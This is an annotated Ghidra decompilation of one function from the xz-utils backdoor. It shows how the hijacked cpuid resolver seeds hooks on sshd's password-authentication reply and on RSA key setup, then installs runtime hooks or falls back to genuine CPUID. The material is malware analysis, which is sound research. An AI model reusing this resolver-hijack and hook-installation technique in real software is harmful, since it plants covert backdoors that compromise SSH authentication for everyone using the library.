// /home/kali/xzre-ghidra/xzregh/106F30_cpuid_ifunc_stage2_install_hooks.c
// Function: cpuid_ifunc_stage2_install_hooks @ 0x106F30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall cpuid_ifunc_stage2_install_hooks(elf_entry_ctx_t * ctx, u64 * caller_frame, void * * cpuid_got_addr, backdoor_cpuid_reloc_consts_t * reloc_consts)


/*
 * AutoDoc: Runs inside the hijacked cpuid resolver. It carves stack `backdoor_shared_globals_t`,
 * `backdoor_hooks_ctx_t`, and `backdoor_setup_params_t` blobs, wipes them, seeds the shared-globals struct with the monitor hooks
 * plus EVP/RSA trampolines, and primes the dummy check state with `lzma_check_init()` so the params are ready for
 * `backdoor_install_runtime_hooks`. It keeps calling `hooks_ctx_init_or_wait_for_shared_globals()` until the helper stops returning 0x65, copying the seeded shared globals
 * into each retry context. Once the block exists it stores the pointers into the params and hands control to `backdoor_install_runtime_hooks`.
 * Exhausting the retries zeros the GOT bookkeeping and issues genuine CPUID leaf 0/1 so glibc’s resolver can keep running before
 * returning FALSE.
 */

#include "xzre_types.h"

BOOL cpuid_ifunc_stage2_install_hooks
               (elf_entry_ctx_t *ctx,u64 *caller_frame,void **cpuid_got_addr,
               backdoor_cpuid_reloc_consts_t *reloc_consts)

{
  int *max_leaf_info;
  u32 *cpuid_info;
  u32 cpuid_ebx;
  u32 cpuid_ecx;
  u32 cpuid_edx;
  int hooks_init_status;
  BOOL stage2_success;
  long wipe_idx;
  backdoor_shared_globals_t *shared_globals_ptr;
  backdoor_hooks_ctx_t *hooks_ctx_retry_cursor;
  backdoor_hooks_ctx_t *hooks_ctx_cursor;
  backdoor_hooks_ctx_t *hooks_ctx_retry_next;
  backdoor_setup_params_t *setup_params_cursor;
  backdoor_setup_params_t setup_params;
  backdoor_hooks_ctx_t hooks_ctx;
  backdoor_shared_globals_t shared_globals;
  backdoor_shared_globals_t seed_shared_globals;
  backdoor_hooks_ctx_t bootstrap_hooks_ctx;
  backdoor_setup_params_t setup_params_block;
  
  hooks_ctx_cursor = &bootstrap_hooks_ctx;
  // AutoDoc: Blank the on-stack `backdoor_hooks_ctx_t` so every bootstrap scratch slot starts predictable before we call `hooks_ctx_init_or_wait_for_shared_globals()`.
  for (wipe_idx = 0x22; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
    hooks_ctx_cursor->bootstrap_scratch[0] = '\0';
    hooks_ctx_cursor->bootstrap_scratch[1] = '\0';
    hooks_ctx_cursor->bootstrap_scratch[2] = '\0';
    hooks_ctx_cursor->bootstrap_scratch[3] = '\0';
    hooks_ctx_cursor = (backdoor_hooks_ctx_t *)(hooks_ctx_cursor->bootstrap_scratch + 4);
  }
  setup_params_cursor = &setup_params_block;
  // AutoDoc: Apply the same zeroing pass to `backdoor_setup_params_t`; it will later carry pointers handed to `backdoor_install_runtime_hooks()`.
  for (wipe_idx = 0x22; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
    setup_params_cursor->bootstrap_padding[0] = '\0';
    setup_params_cursor->bootstrap_padding[1] = '\0';
    setup_params_cursor->bootstrap_padding[2] = '\0';
    setup_params_cursor->bootstrap_padding[3] = '\0';
    setup_params_cursor = (backdoor_setup_params_t *)(setup_params_cursor->bootstrap_padding + 4);
  }
  // AutoDoc: Seed the transient shared-globals block with the monitor hooks and RSA/EVP trampolines so the first successful setup can publish them.
  seed_shared_globals.authpassword_hook_entry = mm_answer_authpassword_send_reply_hook;
  seed_shared_globals.evp_set1_rsa_hook_entry = evp_pkey_set1_rsa_backdoor_shim;
  seed_shared_globals.global_ctx_slot = (global_context_t **)&global_ctx;
  // AutoDoc: Prime the dummy `lzma_check_state` buffer because `backdoor_install_runtime_hooks` expects this struct to hold a valid check context.
  lzma_check_init(&setup_params_block.dummy_check_state,LZMA_CHECK_NONE);
  shared_globals_ptr = &seed_shared_globals;
  // AutoDoc: Prime the hooks context once before entering the retry loop so we can immediately call `backdoor_install_runtime_hooks` if shared globals are ready.
  hooks_init_status = hooks_ctx_init_or_wait_for_shared_globals(&bootstrap_hooks_ctx);
  hooks_ctx_cursor = hooks_ctx_retry_cursor;
  do {
    if (hooks_init_status == 0) {
      setup_params_block.shared_globals = shared_globals_ptr;
      setup_params_block.entry_ctx = ctx;
      // AutoDoc: Hand the fully-populated params to `backdoor_install_runtime_hooks`; success means the hooks installed and we never fall back to real CPUID.
      stage2_success = backdoor_install_runtime_hooks(&setup_params_block);
      return stage2_success;
    }
    // AutoDoc: Copy the seeded shared-globals pointer into the retry context so every subsequent `hooks_ctx_init_or_wait_for_shared_globals()` call sees the provisional block.
    bootstrap_hooks_ctx.shared_globals_ptr = shared_globals_ptr;
    hooks_init_status = hooks_ctx_init_or_wait_for_shared_globals(hooks_ctx_cursor);
    hooks_ctx_cursor = hooks_ctx_retry_next;
  } while (hooks_init_status != 5);
  // AutoDoc: If we burned through the retries, zero the GOT bookkeeping and defer to glibc’s cpuid resolver so execution can continue safely.
  ctx->cpuid_random_symbol_addr = (void *)0x1;
  (ctx->got_ctx).tls_got_entry = (void *)0x0;
  (ctx->got_ctx).cpuid_got_slot = (void *)0x0;
  (ctx->got_ctx).cpuid_slot_index = 0;
  (ctx->got_ctx).got_base_offset = 0;
  // AutoDoc: Issue real CPUID leaves 0/1 to refresh the cached register snapshot before returning FALSE.
  max_leaf_info = (int *)cpuid_basic_info(0);
  if (*max_leaf_info != 0) {
    // AutoDoc: Capture the leaf-1 register snapshot so the fallback path can repopulate `ctx->got_ctx` without re-running stage two.
    cpuid_info = (u32 *)cpuid_Version_info(1);
    cpuid_ebx = cpuid_info[1];
    cpuid_ecx = cpuid_info[2];
    cpuid_edx = cpuid_info[3];
    *(u32 *)&(ctx->got_ctx).tls_got_entry = *cpuid_info;
    *(u32 *)&(ctx->got_ctx).cpuid_got_slot = cpuid_ebx;
    *(u32 *)&(ctx->got_ctx).cpuid_slot_index = cpuid_edx;
    *(u32 *)&(ctx->got_ctx).got_base_offset = cpuid_ecx;
  }
  return FALSE;
}

